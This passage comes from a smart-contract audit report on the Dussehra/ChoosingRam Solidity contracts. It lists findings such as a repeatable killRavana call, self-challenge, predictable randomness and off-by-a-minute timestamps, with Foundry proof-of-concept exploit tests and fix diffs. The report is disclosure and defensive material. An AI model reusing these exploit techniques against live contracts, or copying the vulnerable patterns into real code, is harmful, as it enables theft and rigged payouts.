    function test_killRavanaCanBeCalledTwoTimesDenyingRewardForRam() public participants {
        vm.warp(1728691200 + 1);

        vm.prank(organiser);
        choosingRam.selectRamIfNotSelected();

        vm.startPrank(makeAddr("randomCaller"));
        dussehra.killRavana();
        dussehra.killRavana();
        vm.stopPrank();

        assertTrue(address(dussehra).balance == 0);

        vm.prank(choosingRam.selectedRam());
        vm.expectRevert("Failed to send money to Ram");
        dussehra.withdraw();
    }
```

</details>

## Impact

If `Dussehra::killRavana` function is called twice in row by any random caller, selected Ram will not be able to withdraw his reward. In that case all entrance fees will go to organiser.

## Tools Used

Manual review

## Recommendations

Add modifier `RavanNotKilled` to `Dussehra::killRavana` function to prevent that function can be called twice.

```diff
+   modifier RavanNotKilled() {
+       require(!IsRavanKilled, "Ravan is already killed");
+       _;
+   }

    .
    .

-   function killRavana() public RamIsSelected {
+   function killRavana() public RamIsSelected RavanNotKilled {
        // Oct 11 2024 23:57:49 (GMT)
        if (block.timestamp < 1728691069) {
            revert Dussehra__MahuratIsNotStart();
        }
        // Oct 13 2024 00:01:09 (GMT)
        if (block.timestamp > 1728777669) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```

## <a id='M-02'></a>M-02. Lack of check in `ChoosingRam::increaseValuesOfParticipants` function allows that player can play against himself.

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [MattJenkins](/profile/clwg2lch4000k5uks29zntzmd), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [Vesper](/profile/clqi6jcnd000q11zrf8zoazye), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [0xlrivo](/profile/clqo26w180006cl27lldffow6), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [azanux](/profile/clk45q9ry0000l5080kf923kw), [0x1912](/profile/clumv78j80003i5grvm92bhw4), [Mahith](/profile/clk4h065x000amh08ni7y8bpe), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Audix](/profile/clvohjv4k0000j10cbvsj3a1z), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [feder](/profile/clukfyu7m000012x3nvwo6cm7), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7). Selected submission by: [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33

## Summary

Lack of check in `ChoosingRam::increaseValuesOfParticipants` function allows a player to play against himself, which should not be allowed.

## Vulnerability Details

```javascript
    // @audit - caller can play against himself
    function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }
        .
        .
    }
```

`ChoosingRam::increaseValuesOfParticipants` function allows to increase value of Ram NFT. Function accepts token id of challenger (caller) and token id of any participant that also holds Ram NFT. Problem arises because caller can input his token id both as challenger and participant and function does not have check for this scenario. This means challenger can play versus himself, which shouldn't be allowed.

1. Player mints Ram NFT with token id 0.
2. Assert that token id 0 is not Jita Krodhah.
3. Player calls `ChoosingRam::increaseValuesOfParticipants` function with token id 0 as challenger and token id 0 as participant. Token increased value to Jita Krodhah.
4. Player calls `ChoosingRam::increaseValuesOfParticipants` function again with token id 0 as challenger and token id 0 as participant. Token increased value to Dhyutimaan.

<details>
<summary>PoC</summary>

Place the following test into `Dussehra.t.sol`.

```javascript
    function test_challengerCanPlayVsHimself() public participants {
        assertTrue(ramNFT.getCharacteristics(0).isJitaKrodhah == false);

        vm.startPrank(player1);
        choosingRam.increaseValuesOfParticipants(0, 0);

        assertTrue(ramNFT.getCharacteristics(0).isJitaKrodhah == true);

        choosingRam.increaseValuesOfParticipants(0, 0);

        assertTrue(ramNFT.getCharacteristics(0).isDhyutimaan == true);
    }
```

</details>

## Impact

Owner of Ram NFT token can easily increase value without chance of losing because he is playing against himself, it is win-win situation. This is not desired behavior, because that player could easily become selected Ram within few function calls.

## Tools Used

Manual review

## Recommendations

Add additional check in `ChoosingRam::increaseValuesOfParticipants` function to prevent player from playing against himself.

```diff
+   error ChoosingRam__CannotPlayAgainstYourself();

    .
    .

    function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }
+       if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram == msg.sender) {
+           revert ChoosingRam__CannotPlayAgainstYourself();
+       }

        if (block.timestamp > 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamFinish();
        }
```


# Low Risk Findings

## <a id='L-01'></a>L-01. The organiser can predict the outcome of `ChoosingRam::selectRamIfNotSelected` and select the user who will get the reward

_Submitted by [vile](/profile/clvl1hox70000qclhbwnf9nhh), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [NourElden](/profile/clsj2nv2y0006l5rg1oswt3ys), [maikelordaz](/profile/cltpyvz0u0000f3xerby0tpdw), [4lifemen](/profile/clx78updg0000r91i3473u4ld), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [Waydou](/profile/clvz7qsg6000011q5lrhfnbx2), [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [AuditorNate](/profile/clx5gbk8x0000lu48o9yrw6vz), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [mujahideth](/profile/clk4c6ntg002glb0858cwv4yc), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [BadalSharma](/profile/clqr9x7ok0000xj22sa1owbxb), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [DanielEth](/profile/clshml0b2000owdlalgjw9d0j), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [poolig4n](/profile/clv6k6av2000so6ttdnmiojn8), [azanux](/profile/clk45q9ry0000l5080kf923kw), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [kostov](/profile/clqgi3grk0006hu2kfkivifte), [feder](/profile/clukfyu7m000012x3nvwo6cm7), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [mirkopezo](/profile/clt3lx7sj00009lvy1bxxjxi9). Selected submission by: [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L83

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L90

## Summary

The function `ChoosingRam::selectRamIfNotSelected` depends on a random value to select the participant to be selected as Ram. This function generates the random number by using `block.timestamp` and `block.prevrandao` values. Those values are considered a bad source of randomness. The organiser can predict the outcome and execute the function only if the desired user will become Ram. The selected Ram will take the reward.

## Vulnerability Details

Using `block.timestamp` as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. Also, for some chains like zkSync `block.prevrandao` is a [constant value](https://docs.zksync.io/build/developer-reference/ethereum-differences/evm-instructions#difficulty-prevrandao). This will allow the users to predict the result of the calculated number in [Line 90](https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L90) of `ChoosingRam.sol`: `uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();`. This will give the organiser the opportunity to break the random selection of the Ram and to select a specific user who will collect the reward.

## Proof of Concept

The following code demonstrates how an attack can be executed.

```js
function test_ramSelectionIsNotRandom() public {
    Dussehra dussehra;
    RamNFT ramNFT;
    ChoosingRam choosingRam;
    address organiser = makeAddr("organiser");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address player3 = makeAddr("player3");

    vm.startPrank(organiser);
    ramNFT = new RamNFT();
    choosingRam = new ChoosingRam(address(ramNFT));
    dussehra = new Dussehra(1 ether, address(choosingRam), address(ramNFT));
    ramNFT.setChoosingRamContract(address(choosingRam));
    vm.stopPrank();

    vm.startPrank(player1);
    vm.deal(player1, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(player2);
    vm.deal(player2, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    vm.startPrank(player3);
    vm.deal(player3, 1 ether);
    dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
    vm.stopPrank();

    // the organiser wants player2 to become Ram
    vm.startPrank(organiser);
    uint256 time = 1728691200 + 1;
    // the loop will execute until player2 is the Ram
    while (true) {
        vm.warp(++time);
        uint256 random = uint256(
            keccak256(abi.encodePacked(block.timestamp, block.prevrandao))
        ) % ramNFT.tokenCounter();

        // the outcome of the random calculation is checked
        if (ramNFT.getCharacteristics(random).ram == player2) {
            // if the player2 will be the Ram then
            // selectRamIfNotSelected is executed
            choosingRam.selectRamIfNotSelected();
            break;
        }
    }
    vm.warp(time);
    vm.stopPrank();

    // it is confirmed that player2 is the Ram
    assertEq(choosingRam.isRamSelected(), true);
    assertEq(choosingRam.selectedRam(), player2);
}
```

## Impact

The bad source of randomness gives the opportunity to the organiser to select the specific user which will become Ram and which will get the reward. Although, the organiser is considered to be trusted, the desired logic of the contract is not implemented correctly. The random number is not really a random number.

## Tools Used

Manual review

## Recommendations

Consider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/vrf). The Chainlink VRF gives two methods to request randomness: subscription and direct funding method. They will have their added cost, but will solve the randomness issues of the `Dussehra` contract.

## <a id='L-02'></a>L-02. Block.timestamp on Arbitrum can be off by 24 hours. 

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [nem0x001](/profile/clvxvlp6300092p0m0ax68l8t), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u). Selected submission by: [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra

### [M-1] The `Dussehra` protocol will be deployed, among others, to the `Arbitrum`. However, `block.timestamp` on the Arbitrum nova L2 chain can be off by as much as 24 hours. This has the potential of breaking the intended functionality of the protocol by shifting the dates at which the `Dussehra::killRavana` function can be called beyond the intended 12 to 13 October 2024 period. 

**Description:** Quoting from [Arbitrum's documentation](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#:~:text=Block%20timestamps%3A%20Arbitrum,in%20the%20future): 
> Block timestamps on Arbitrum are not linked to the timestamp of the L1 block. They are updated every L2 block based on the sequencer's clock. These timestamps must follow these two rules:
> 1. Must be always equal or greater than the previous L2 block timestamp
> 2. Must fall within the established boundaries (24 hours earlier than the current time or 1 hour in the future)." 

This implies that block.timestamps on Arbitrum can be off by up to 24 hours.

**Impact:**  The time that the `Dussehra::killRavana` function can be called can potentially shifts beyond the intended 12 to 13 October 2024 period. 

Related, but more unlikely, if the organiser calls the `ChoosingRam::selectRamIfNotSelected` function through a sequencer that is 24 hours to slow, and subsequently is forced to call `Dussehra::killRavana` through a sequencer that is an hour too fast, the organiser might miss the time window to kill Ravana - breaking the protocol.

**Recommended Mitigation:** Use an off-chain source (for instance Chainlink's Time Based Upkeeps) to initiate (or limit) functions based on time. This is especially important when deploying to L1 and multiple L2 chains, as timestamps will always differ between chains and sequencers.  
## <a id='L-03'></a>L-03. Incorrect Timestamp Validation in `killRavana` Function of `Dussehra` Contract

_Submitted by [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [4rdiii](/profile/cltd0fp0400016x0wyrg9ny31), [CarlosAlbaWork](/profile/clrw1ekq80007u9z6ke2mx6yr), [Vesper](/profile/clqi6jcnd000q11zrf8zoazye), [Keyword](/profile/clq9wfw3c0000ulgq5mkbqnmf), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [paprikrumplikas](/profile/clrj23lnp006g14oum8qxro25), [Enchev](/profile/clvuhiie70000behfon10s33j), [AuditorNate](/profile/clx5gbk8x0000lu48o9yrw6vz), [kazan](/profile/clojsw8kw000cl408g7y0xlw5), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [0xlrivo](/profile/clqo26w180006cl27lldffow6), [edsardgrisel](/profile/cltitj8pl0000ruev9oot7rnk), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [funkyenough](/profile/clqotfl5o0006v790craeiqjv), [azanux](/profile/clk45q9ry0000l5080kf923kw), [Bbash](/profile/clkcphh780004mp083mgcgae1), [10ap17](/profile/clvbi0ngt0000fz99bhftjifl), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Audix](/profile/clvohjv4k0000j10cbvsj3a1z), [CodexBugmeNot](/profile/cluv8w2my0000nlrt5vqpin31), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7). Selected submission by: [10ap17](/profile/clvbi0ngt0000fz99bhftjifl)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/main/src/Dussehra.sol

## Summary
The `killRavana` function in the `Dussehra` contract contains incorrect `timestamp` checks, allowing the function to be executed outside the intended window of `12th October 2024` to `13th October 2024`. This could lead to unintended and potentially harmful executions of the function, disrupting the event's integrity.

## Vulnerability Details
The `killRavana` function is designed to be executed within a specific time frame: after `12th October 2024` and before `13th October 2024`. However, the current implementation uses incorrect timestamp values, allowing the function to be called `one minute` before `12th October 2024` and `one minute` after `13th October 2024`. Specifically, the timestamps `1728691029` and `1728777669` are not accurate representations of the intended dates.

##### Cause of the Issue
The incorrect `timestamp` values in the code cause this issue. The values `1728691029` and `1728777669` do not align with the exact start and end times for `12th October 2024` and `13th October 2024`, respectively.
The timestamps used in the `killRavana` function translate to the: 
1. `1728691069` == `Fri Oct 11. 2024. 23:57:49 GMT+0000 `
2. `1728777669` == `Sun, Oct 13. 2024. 00:01:09 GMT+0000` 

##### Likelihood of Occurrence
This issue is very likely to occur as it directly stems from hardcoded incorrect `timestamps`. Any user attempting to execute the `killRavana` function within the specified range but slightly off by a minute will encounter this bug.
## Proof of Code
This `PoC` demonstrates that the `killRavana` function can be executed one minute after the intended window, showing that the incorrect `timestamp` values allow the function to be called outside the designated period.
```solidity
function test_killRavanaAfter13thOfOctober()external{
         vm.startPrank(player1);
        vm.deal(player1, 1 ether);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.stopPrank();
        
        vm.warp(1728691200 + 1);
        
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        vm.warp(1728777600 + 1);
        vm.startPrank(player2);
        dussehra.killRavana();
        vm.stopPrank();
    }
```

We run the test using `forge test --match-test test_killRavanaAfter13thOfOctober -vvvv` and the result of this test will show a `pass`, indicating that the function call was successful despite being outside the designated period, thus confirming the `existence` of the vulnerability.

```
forge test --match-test test_killRavanaAfter13thOfOctober -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/Dussehra.t.sol:CounterTest
[PASS] test_killRavanaAfter13thOfOctober() (gas: 271399)
Traces:
  [271399] CounterTest::test_killRavanaAfter13thOfOctober()
    ├─ [0] VM::startPrank(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [169497] Dussehra::enterPeopleWhoLikeRam{value: 1000000000000000000}()
    │   ├─ [94460] RamNFT::mintRamNFT(player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84], tokenId: 0)
    │   │   └─ ← [Stop] 
    │   ├─ emit PeopleWhoLikeRamIsEntered(competitor: player1: [0x7026B763CBE7d4E72049EA67E89326432a50ef84])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(1728691201 [1.728e9])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(organiser: [0xe81f335f0c35d66819c4dF203d728f579880b4b1])
    │   └─ ← [Return] 
    ├─ [33984] ChoosingRam::selectRamIfNotSelected()
    │   ├─ [2360] RamNFT::organiser() [staticcall]
    │   │   └─ ← [Return] organiser: [0xe81f335f0c35d66819c4dF203d728f579880b4b1]
    │   ├─ [361] RamNFT::tokenCounter() [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1224] RamNFT::getCharacteristics(0) [staticcall]
    │   │   └─ ← [Return] CharacteristicsOfRam({ ram: 0x7026B763CBE7d4E72049EA67E89326432a50ef84, isJitaKrodhah: false, isDhyutimaan: false, isVidvaan: false, isAatmavan: false, isSatyavaakyah: false })
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(1728777601 [1.728e9])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(player2: [0xEb0A3b7B96C1883858292F0039161abD287E3324])
    │   └─ ← [Return] 
    ├─ [37874] Dussehra::killRavana()
    │   ├─ [376] ChoosingRam::isRamSelected() [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [0] organiser::fallback{value: 500000000000000000}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.24ms (171.79µs CPU time)

Ran 1 test suite in 586.51ms (1.24ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## Impact
This vulnerability can lead to the `killRavana` function being executed outside the intended time window, which can result in:

1. Premature or delayed execution of the function.
2. Financial discrepancies where the `organiser` might receive funds outside the designated period.
3. Compromised event integrity, as the timing of the key event phase (`killing Ravana`) would be inaccurate.

## Tools Used
1. Manual Code Review
2. Foundry

## Recommendations
To fix this vulnerability, the `killRavana` function should use accurate `timestamp` values that precisely represent the start and end times for `12th October 2024` and `13th October 2024`. Additionally, it's essential to verify the timestamps' correctness to prevent similar issues in the future.
```diff
function killRavana() public RamIsSelected {
-        if (block.timestamp < 1728691069) {
+       if (block.timestamp < 1728691200) {
            revert Dussehra__MahuratIsNotStart();
        }
-        if (block.timestamp > 1728777669) {
+       if (block.timestamp > 1728777600) {
            revert Dussehra__MahuratIsFinished();
        }
        IsRavanKilled = true;
        uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
        totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;
        (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
        require(success, "Failed to send money to organiser");
    }
```
Running the `PoC` again:
```
forge test --match-test test_killRavanaAfter13thOfOctober -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/Dussehra.t.sol:CounterTest
[FAIL. Reason: Dussehra__MahuratIsFinished()] test_killRavanaAfter13thOfOctober() (gas: 236319)
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.88ms (177.92µs CPU time)

Ran 1 test suite in 4.10ms (1.88ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/Dussehra.t.sol:CounterTest
[FAIL. Reason: Dussehra__MahuratIsFinished()] test_killRavanaAfter13thOfOctober() (gas: 236319)

Encountered a total of 1 failing tests, 0 tests succeeded
```
After running the `PoC` again, we can verify that the vulnerability has been fixed.
## Conclusion

By correcting the `timestamp` values in the `killRavana` function, we have ensured that the function can only be executed within the intended time window. This change prevents any premature or delayed execution, preserving the event's integrity and ensuring the correct distribution of funds.
## <a id='L-04'></a>L-04. Funds are locked in `Dussehra.sol` contract  when the `withdraw` function is called. 

_Submitted by [passandscore](/profile/clwgevlj50016i1wzeoa7n01d), [NightHawK](/profile/clvmfeh090004jbg1f2oa6srl), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [7Cedars](/profile/clvoxksqz000czknxe8hcp7kw), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u). Selected submission by: [passandscore](/profile/clwgevlj50016i1wzeoa7n01d)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2024-06-Dussehra/blob/main/src/Dussehra.sol#L76

https://github.com/Cyfrin/2024-06-Dussehra/blob/main/src/Dussehra.sol#L46

## Summary
When the `killRavana` function is called in the `Dussehra.sol` contract, the funds are not divided correctly. This results in a remainder of the division that is not accounted for. This remainder will be locked in the contract and not be able to be withdrawn by the organizer. 

## Vulnerability Details
Performing `totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;` in the `Dussehra.sol:killRavana` will not always result in a number that is truly 50% of the total amount. This happens when an entry fee, passed to the contracts constructor in Wei is not divisible by 2 when multiplied by the number of participants. 

## Impact
After the organizer and the selected Ram have received their funds, the remainder of the division will be locked in the contract. This will result in the organizer not being able to withdraw the funds.

## Tools Used
Stateless Fuzz Testing.

**Proof of Concept:** 

1. `Dussehra.sol` is deployed with an entry fee in wei (fuzzed) that is not divisible by 2 when multiplied by the number of participants.
2. Enter participants with the fuzzed entrance fee.
3. Warp to the time when the event is finished
4. Organizer calls `selectRamIfNotSelected` and `killRavana`
5. The funds are divided and the remainder is locked in the contract.
6. Organizer recieves half of the funds during the `killRavana` call.
7. The selected ram calls 'withdraw` and  recieves the other half, while the remainder is locked in the contract.

**Steps to Reproduce:**
1. Create a new test file called `LockedFundsAfterWithDraw.t.sol`
2. Add the code below to the file.
3. Run the test with `forge test --match-path test/LockedFundsAfterWithDraw.t.sol -vvv`



**Proof of Code:** 

<details>
<summary>Code</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Dussehra} from "../src/Dussehra.sol";
import {ChoosingRam} from "../src/ChoosingRam.sol";
import {RamNFT} from "../src/RamNFT.sol";

contract LockedFundsAfterWithDraw is Test {
    error Dussehra__NotEqualToEntranceFee();
    error Dussehra__AlreadyClaimedAmount();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();

    Dussehra public dussehra;
    RamNFT public ramNFT;
    ChoosingRam public choosingRam;

    address public organiser = makeAddr("organiser");
    address public player1 = makeAddr("player1");
    address public player2 = makeAddr("player2");
    address public player3 = makeAddr("player3");

    function deploy(uint256 entranceFee) public {

        vm.startPrank(organiser);
        ramNFT = new RamNFT();
        choosingRam = new ChoosingRam(address(ramNFT));
        dussehra = new Dussehra(entranceFee, address(choosingRam), address(ramNFT));

        ramNFT.setChoosingRamContract(address(choosingRam));
        vm.stopPrank();
    }

    function enterParticipants(uint256 entranceFee) internal {
        vm.startPrank(player1);
        vm.deal(player1, entranceFee);
        dussehra.enterPeopleWhoLikeRam{value: entranceFee}();
        vm.stopPrank();

        vm.startPrank(player2);
        vm.deal(player2, entranceFee);
        dussehra.enterPeopleWhoLikeRam{value: entranceFee}();
        vm.stopPrank();

        vm.startPrank(player3);
        vm.deal(player3, entranceFee);
        dussehra.enterPeopleWhoLikeRam{value: entranceFee}();
        vm.stopPrank();
    }

    function test_withdraw_locks_funds(uint256 entranceFee) public {
        // Set up the contracts with the fuzzed entrance fee
        entranceFee = bound(entranceFee, 0.01 ether, 1 ether);
        deploy(entranceFee);

        // Enter participants with the fuzzed entrance fee
        enterParticipants(entranceFee);

        // Warp to the time when the event is finished
        vm.warp(1728691200 + 1);

        // Select Ram as a winner
        vm.startPrank(organiser);
        choosingRam.selectRamIfNotSelected();
        vm.stopPrank();

        // Determine the winner
        address winner = choosingRam.selectedRam() == player1
            ? player1
            : choosingRam.selectedRam() == player2
                ? player2
                : player3;

        vm.startPrank(winner);
        dussehra.killRavana();

        uint256 RamWinningAmount = dussehra.totalAmountGivenToRam();

        // Check the balance of the organiser
        assertEq(organiser.balance, RamWinningAmount);

        dussehra.withdraw();
        vm.stopPrank();

        // check the balance of the winner
        assertEq(winner.balance, RamWinningAmount);

        // check that the balance of the winner and the organiser is the same
        assertEq(winner.balance, organiser.balance);

        // check that the balance of the contract is 0
        assertEq(address(dussehra).balance, 0 ether);
    }
}
```

</details>

## Recommendations
Performing `totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;` is already a more accurate way to calculate the 50% of the total amount. However, the `killRavana` function should be updated to ensure that after the 50% is calculated, the remainder of contract funds are sent to the organizer. This will prevent any funds from being locked in the contract.

```diff
 function killRavana() public RamIsSelected {
    if (block.timestamp < 1728691069) {
        revert Dussehra__MahuratIsNotStart();
    }
    if (block.timestamp > 1728777669) {
        revert Dussehra__MahuratIsFinished();
    }
    IsRavanKilled = true;
    uint256 totalAmountByThePeople = WantToBeLikeRam.length * entranceFee;
    totalAmountGivenToRam = (totalAmountByThePeople * 50) / 100;

+   uint256 remainder = totalAmountByThePeople - totalAmountGivenToRam;
        
-   (bool success, ) = organiser.call{value: totalAmountGivenToRam}("");
+  (bool success, ) = organiser.call{value: remainder}("");
    require(success, "Failed to send money to organiser");
    }
```




    